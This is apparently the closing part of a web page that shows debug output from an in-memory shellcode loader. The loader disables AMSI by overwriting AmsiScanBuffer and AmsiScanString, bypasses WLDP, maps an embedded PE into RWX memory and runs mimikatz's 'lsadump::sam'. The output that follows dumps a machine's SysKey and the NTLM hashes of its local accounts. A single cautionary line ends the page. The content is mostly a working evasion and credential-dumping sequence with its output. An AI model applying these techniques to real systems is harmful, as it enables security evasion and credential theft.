DEBUG: loader.c:146:MainProc(): Resolving API address for 6AD83BB027CB8950
DEBUG: loader.c:146:MainProc(): Resolving API address for 075C6A327F3D52DB
DEBUG: loader.c:146:MainProc(): Resolving API address for AD03505359068DDD
DEBUG: loader.c:146:MainProc(): Resolving API address for D31A2728E6D7F91B
DEBUG: loader.c:146:MainProc(): Resolving API address for 88B9E7C080529C23
DEBUG: loader.c:146:MainProc(): Resolving API address for C05B40A05E75B7AF
DEBUG: loader.c:146:MainProc(): Resolving API address for 476867E50311505F
DEBUG: loader.c:146:MainProc(): Resolving API address for D9CFF4875AB529CE
DEBUG: loader.c:146:MainProc(): Resolving API address for 0B58E092C382C1D8
DEBUG: loader.c:146:MainProc(): Resolving API address for 0FCAC4B0A7371A6E
DEBUG: loader.c:146:MainProc(): Resolving API address for A94916E3CB631C1D
DEBUG: loader.c:146:MainProc(): Resolving API address for DC37FFCDEBF7DFED
DEBUG: loader.c:146:MainProc(): Resolving API address for 5A48A3BD4290F724
DEBUG: loader.c:146:MainProc(): Resolving API address for E2F204B2C01D6089
DEBUG: loader.c:146:MainProc(): Resolving API address for 74B5DB338A4AF815
DEBUG: loader.c:146:MainProc(): Resolving API address for 60B462D7520D7EC8
DEBUG: loader.c:146:MainProc(): Resolving API address for 8FA067B6C450A239
DEBUG: loader.c:146:MainProc(): Resolving API address for 48019ACD2CD26948
DEBUG: loader.c:146:MainProc(): Resolving API address for 42A7B59357E517C7
DEBUG: loader.c:146:MainProc(): Resolving API address for B7A45FEF69C28901
DEBUG: loader.c:146:MainProc(): Resolving API address for F356C5B73892175F
DEBUG: loader.c:146:MainProc(): Resolving API address for 9145E115B31BBFFC
DEBUG: peb.c:87:FindExport(): 9145e115b31bbffc is forwarded to api-ms-win-core-com-l1-1-0.CoInitializeEx
DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoInitializeEx)
DEBUG: loader.c:146:MainProc(): Resolving API address for 262950647E303460
DEBUG: peb.c:87:FindExport(): 262950647e303460 is forwarded to api-ms-win-core-com-l1-1-0.CoCreateInstance
DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoCreateInstance)
DEBUG: loader.c:146:MainProc(): Resolving API address for 1A99B4A712B76012
DEBUG: peb.c:87:FindExport(): 1a99b4a712b76012 is forwarded to api-ms-win-core-com-l1-1-0.CoUninitialize
DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoUninitialize)
DEBUG: loader.c:146:MainProc(): Resolving API address for BDD45D8283900E74
DEBUG: loader.c:146:MainProc(): Resolving API address for 77F04BB55F5347A8
DEBUG: loader.c:146:MainProc(): Resolving API address for 4AF81E45D5D95835
DEBUG: loader.c:146:MainProc(): Resolving API address for E1A7F96405BB7106
DEBUG: loader.c:146:MainProc(): Resolving API address for 94BD36C7C295FC52
DEBUG: loader.c:146:MainProc(): Resolving API address for 6F98A33E6DA4986C
DEBUG: loader.c:146:MainProc(): Resolving API address for 88A2232B0869DF41
DEBUG: loader.c:146:MainProc(): Resolving API address for 4E8E2A23D41A8E6B
DEBUG: loader.c:146:MainProc(): Resolving API address for F2031AF815C04AEC
DEBUG: loader.c:162:MainProc(): Using module embedded in instance
DEBUG: bypass.c:112:DisableAMSI(): Length of AmsiScanBufferStub is 36 bytes.
DEBUG: bypass.c:122:DisableAMSI(): Overwriting AmsiScanBuffer
DEBUG: bypass.c:137:DisableAMSI(): Length of AmsiScanStringStub is 36 bytes.
DEBUG: bypass.c:147:DisableAMSI(): Overwriting AmsiScanString
DEBUG: loader.c:173:MainProc(): DisableAMSI OK
DEBUG: bypass.c:326:DisableWLDP(): Length of WldpQueryDynamicCodeTrustStub is 20 bytes.
DEBUG: bypass.c:350:DisableWLDP(): Length of WldpIsClassInApprovedListStub is 36 bytes.
DEBUG: loader.c:179:MainProc(): DisableWLDP OK
DEBUG: loader.c:186:MainProc(): Compression engine is 4
DEBUG: loader.c:189:MainProc(): Allocating 1015240 bytes of memory for decompressed file and module information
DEBUG: loader.c:199:MainProc(): Duplicating DONUT_MODULE
DEBUG: loader.c:203:MainProc(): Decompressing 478726 -> 1013912
DEBUG: loader.c:213:MainProc(): WorkSpace size : 1415999 | Fragment size : 5161
DEBUG: loader.c:233:MainProc(): Checking type of module
DEBUG: inmem_pe.c:106:RunPE(): Allocating 1019904 (0xf9000) bytes of RWX memory for file
DEBUG: inmem_pe.c:115:RunPE(): Copying Headers
DEBUG: inmem_pe.c:118:RunPE(): Copying each section to RWX memory 000001FE75990000
DEBUG: inmem_pe.c:130:RunPE(): Applying Relocations
DEBUG: inmem_pe.c:154:RunPE(): Processing the Import Table
DEBUG: inmem_pe.c:162:RunPE(): Loading ADVAPI32.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading Cabinet.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading CRYPT32.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading cryptdll.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading DNSAPI.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading FLTLIB.DLL
DEBUG: inmem_pe.c:162:RunPE(): Loading NETAPI32.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading ole32.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading OLEAUT32.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading RPCRT4.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading SHLWAPI.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading SAMLIB.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading Secur32.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading SHELL32.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading USER32.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading USERENV.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading VERSION.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading HID.DLL
DEBUG: inmem_pe.c:162:RunPE(): Loading SETUPAPI.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading WinSCard.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading WINSTA.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading WLDAP32.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading advapi32.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading msasn1.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading ntdll.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading netapi32.dll
DEBUG: inmem_pe.c:162:RunPE(): Loading KERNEL32.dll
DEBUG: inmem_pe.c:190:RunPE(): Replacing KERNEL32.dll!ExitProcess with ntdll!RtlExitUserThread
DEBUG: inmem_pe.c:162:RunPE(): Loading msvcrt.dll
DEBUG: inmem_pe.c:190:RunPE(): Replacing msvcrt.dll!exit with ntdll!RtlExitUserThread
DEBUG: inmem_pe.c:190:RunPE(): Replacing msvcrt.dll!_cexit with ntdll!RtlExitUserThread
DEBUG: inmem_pe.c:190:RunPE(): Replacing msvcrt.dll!_exit with ntdll!RtlExitUserThread
DEBUG: inmem_pe.c:204:RunPE(): Processing Delayed Import Table
DEBUG: inmem_pe.c:212:RunPE(): Loading bcrypt.dll
DEBUG: inmem_pe.c:212:RunPE(): Loading ncrypt.dll
DEBUG: inmem_pe.c:310:RunPE(): Setting command line: H9C7 lsadump::sam coffee exit
DEBUG: inmem_pe.c:403:SetCommandLineW(): Obtaining handle for kernelbase
DEBUG: inmem_pe.c:419:SetCommandLineW(): Searching 2161 pointers
DEBUG: inmem_pe.c:428:SetCommandLineW(): BaseUnicodeCommandLine at 00007FF94F599E60 : loader  ..\instance
DEBUG: inmem_pe.c:436:SetCommandLineW(): New BaseUnicodeCommandLine at 00007FF94F599E60 : H9C7 lsadump::sam coffee exit
DEBUG: inmem_pe.c:453:SetCommandLineW(): New BaseAnsiCommandLine at 00007FF94F599E70 : H9C7 lsadump::sam coffee exit
DEBUG: inmem_pe.c:477:SetCommandLineW(): Setting ucrtbase.dll!__p__acmdln "loader  ..\instance" to "H9C7 lsadump::sam coffee exit"
DEBUG: inmem_pe.c:514:SetCommandLineW(): Setting ucrtbase.dll!__p__wcmdln "loader  ..\instance" to "H9C7 lsadump::sam coffee exit"
DEBUG: inmem_pe.c:468:SetCommandLineW(): Setting msvcrt.dll!_acmdln "loader  ..\instance" to "H9C7 lsadump::sam coffee exit"
DEBUG: inmem_pe.c:505:SetCommandLineW(): Setting msvcrt.dll!_wcmdln to H9C7 lsadump::sam coffee exit
DEBUG: inmem_pe.c:317:RunPE(): Wiping Headers from memory
DEBUG: inmem_pe.c:326:RunPE(): Creating thread for entrypoint of EXE : 000001FE75A207F8


  .#####.   mimikatz 2.2.0 (x64) #18362 Aug 14 2019 01:31:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::sam
Domain : DESKTOP-B888L2R
SysKey : b43927eef0f56833c527ea951c37abc1
Local SID : S-1-5-21-1047138248-288568923-692962947

SAMKey : f1813d42812fcde9c5fe08807370613d

RID  : 000001f4 (500)
User : Administrator

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: c288f1c30b232571b0222ae6a5b7d223

RID  : 000003e9 (1001)
User : john
  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c

RID  : 000003ea (1002)
User : user
  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c

RID  : 000003eb (1003)
User : test

mimikatz(commandline) # coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'

mimikatz(commandline) # exit
Bye!

DEBUG: inmem_pe.c:332:RunPE(): Process terminated
DEBUG: inmem_pe.c:342:RunPE(): Erasing 1019904 bytes of memory at 000001FE75990000
DEBUG: inmem_pe.c:346:RunPE(): Releasing memory
DEBUG: loader.c:272:MainProc(): Erasing RW memory for instance
DEBUG: loader.c:275:MainProc(): Releasing RW memory for instance
DEBUG: loader.c:283:MainProc(): Returning to caller
</pre>

<p>Obviously you should be cautious with what files you decide to execute on your machine.</p>

</body>
</html>
